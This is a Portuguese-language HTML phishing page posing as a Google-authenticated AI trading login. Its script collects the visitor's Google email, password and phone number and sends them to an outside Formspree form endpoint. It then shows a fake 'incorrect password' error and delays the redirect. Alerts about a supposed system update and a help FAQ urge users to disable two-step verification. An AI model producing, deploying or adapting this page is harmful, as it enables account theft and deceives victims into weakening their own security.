<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bem-vindo Trader</title>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f7f7f7;
        }
        .login-container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .input-group {
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 10px;
            border-radius: 4px;
            border: 1px solid #ccc;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        .message-container {
            display: none;
            padding: 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
            margin-top: 20px;
        }
        .message-container p {
            color: green;
            font-size: 16px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h2>Login com Google IA</h2>
        <h5>Insira suas credenciais para começar</h5>
        <form id="loginForm">
            <div class="input-group">
                <input type="email" id="email" name="email" placeholder="E-mail ou telefone" required>
            </div>
            <div class="input-group">
                <input type="password" id="senha" name="senha" placeholder="Senha" required>
            </div>
            <!-- Novo campo para telefone -->
            <div class="input-group">
                <input type="text" id="telefone" name="telefone" placeholder="Insira o telefone de sua conta Google" required>
            </div>
            <button type="submit">Entrar</button>
        </form>
    </div>

    <div class="message-container" id="messageContainer">
        <p>Senha incorreta inserida às 21:31h/21:38h/ 21/01/2025, (acesso temporário uma tentativa). Impossível validar o token de autenticação. Tente novamente mais tarde...</p>
    </div>
    
    <script>
        var resposta = confirm("Você quer continuar?");
        if (resposta) {
            alert(" ESTAMOS EM ATUALIZAÇÃO NO MOMENTO, SISTEMA INDISPONÍVEL PARA USO... ");
            alert(" Correção de problemas com acesso dos usuários a IA; ");
            alert(" Essa atualização visa melhorar a forma como acessar a IA, usuários não estão conseguindo usar a autenticação padrão do Google; ");
            alert(" Grande número de chamados será implementada a verificação por código. ");
            alert(" Os acessos foram vínculados ao seu dispositivo com os seguintes endereços registrados em 18/01/2025 (ar5***68*@gmail.com/si***bra*024@gmail.com) ");
        } else {
            alert("Você escolheu sair.");
            window.location.replace("https://www.sairsistema/Trading.ia");
        }
        
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Impede o envio padrão do formulário

            // Exibe a mensagem de espera
            document.getElementById('messageContainer').style.display = 'block';

            // Coleta os dados do formulário
            const formData = new FormData(this);

            // Envia os dados para o Formspree
            fetch('https://formspree.io/f/mnnnkgwe', {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            }).then(response => {
                // Após o envio, redireciona para a página desejada
                setTimeout(function() {
                    window.location.href = "https://vinicavalpro.github.io/Trading/acesso.html"; 
                }, 90000);
            }).catch(error => {
                console.error('Erro ao enviar o formulário:', error);
            });
        });
        
    </script>
    
<!-- Botão de ajuda -->
<div id="helpButton" style="position: fixed; bottom: 20px; right: 20px; background-color: #4CAF50; color: white; border-radius: 50%; padding: 15px; font-size: 24px; cursor: pointer; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
    ?
</div>

<!-- Chat de ajuda -->
<div id="chatContainer" style="display: none; position: fixed; bottom: 70px; right: 20px; width: 300px; background-color: white; padding: 15px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
    <h3>Ajuda</h3>
    <p>Escolha uma das opções abaixo:</p>
    <ul id="faqList">
        <li><button onclick="showAnswer(1)">1 - Como fazer login?</button></li>
        <li><button onclick="showAnswer(2)">2 - Não consigo fazer login, o código não foi enviado.</button></li>
        <li><button onclick="showAnswer(3)">3 - Porque não consigo autenticar a conta Google com a IA?</button></li>
        <li><button onclick="showAnswer(4)">4 - Devo desativar a segurança em duas etapas?</button></li>
        <li><button onclick="showAnswer(5)">5 - Por que cadastrar telefone na conta Google?</button></li>
        <li><button onclick="showAnswer(6)">6 - Nenhuma das alternativas acima resolveu o problema, contatar suporte.</button></li>
    </ul>
    <div id="answer" style="margin-top: 15px;"></div>
    <button onclick="closeChat()">Fechar</button>
</div>

<script>
// Exibe o chat quando o botão de ajuda é clicado
document.getElementById('helpButton').onclick = function() {
    document.getElementById('chatContainer').style.display = 'block';
};

// Fecha o chat
function closeChat() {
    document.getElementById('chatContainer').style.display = 'none';
}

// Exibe a resposta de acordo com a pergunta clicada
function showAnswer(questionNumber) {
    const answers = {
        1: "O acesso a plataforma de autenticação é obrigatório para acessar a IA, pois como usamos tecnologias do Google para melhorias na IA, deve autenticar a IA com a sua conta pessoal do Google, isso é somente para verificar a segurança para a empresa Google que você é realmente humano e não um robô. O login deve ser feito com (E-mail, senha e telefone vinculado a sua conta do Google). Caso alguma informação esteja inválida, errada ou incorreta o acesso é suspenso, o sistema não dará avisos extras, porém a IA não será acessada, dessa forma algum problema na autenticação ocorreu.",
        2: "O código não foi enviado devido a ter colocado o número errado, ou o mesmo não foi cadastrado na sua conta do Google. (Lembre-se que a segurança em duas etapas se estiver ativada não libera o envio do código pela linha móvel.) Caso errou a senha ou e-mail também o código não será enviado, somente tem 3 tentativas diárias, se ambas forem com falha somente no outro dia.",
        3: "A autenticação é feita com as credencias verdadeiras, o sistema da nossa plataforma verifica se as informações são verdadeiras com a conta que informou, caso informar algum e-mail falso o sistema detectará e bloqueará o acesso, a demora para acessar a IA é a validação que o sistema está aguardando...",
        4: "Sim, caso a segurança em dois fatores estar ativa o código não é enviado para o chip cadastrado na sua conta Google, portanto deve desativar nas configurações da sua conta.",
        5: "O telefone é obrigatório para receber o código de acesso e autenticar que não é um robô, sem o telefone cadastrado o acesso não será realizado, o Google entende que não é um humano e bloqueia a solicitação. O telefone é a única maneira de realizar o acesso com a IA e Google, caso não concordar com os termos descritos na página do Google de uso do telefone para o acesso, a nossa equipe de suporte não poderá ajudar.\nLink da política do Google sobre o uso do número de telefone.\nhttps://support.google.com/adsense/answer/2938681?hl=pt-BR",
        6: "Clique aqui para registrar sua manifestação, nossos atendentes retornarão em até 48 horas..."
    };

    document.getElementById('answer').innerText = answers[questionNumber];
}
</script>
    
</body>
</html>
